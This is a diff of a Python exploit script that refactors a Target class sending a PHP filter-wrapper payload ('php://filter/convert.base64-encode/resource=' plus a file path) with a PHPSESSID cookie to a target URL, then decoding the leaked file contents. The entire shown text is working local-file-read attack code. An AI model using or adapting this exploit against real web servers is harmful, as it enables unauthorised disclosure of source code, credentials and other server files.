@@ -28,12 +28,15 @@ class Target:
     #Functions
     def printPayload(self, payload):
         print(self.cookie)
-        cookieSessID = {"PHPSESSID" : self.cookie}
-        print(f"Using Cookie : {cookieSessID}")
+        print(f"Using Cookie : {self.cookieSessID}")
         print(f"Target : {self.targetLink}")
         print(f"Payload : {payload}")
+
+    def sendPayload(self, payload):
+        self.cookieSessID = {"PHPSESSID" : self.cookie}
+        self.printPayload(payload)
         rePayload = {"url" : "php://filter/convert.base64-encode/resource=" + payload}
-        re = requests.post(self.targetLink, cookies=cookieSessID, data=rePayload)
+        re = requests.post(self.targetLink, cookies=self.cookieSessID, data=rePayload)
         response = re.text
         indexToDelete = response.find("</html>")
         htmlBadTag = "</html>"
@@ -45,9 +48,6 @@ class Target:
         print(b64decode(finalResponse).decode('utf-8'))
         #res = str(b64decode(finalResponse))
         #print(res)
-
-    def sendPayload(self, payload):
-        self.printPayload(payload)
 
 #MAIN FUNCTION
 def main():
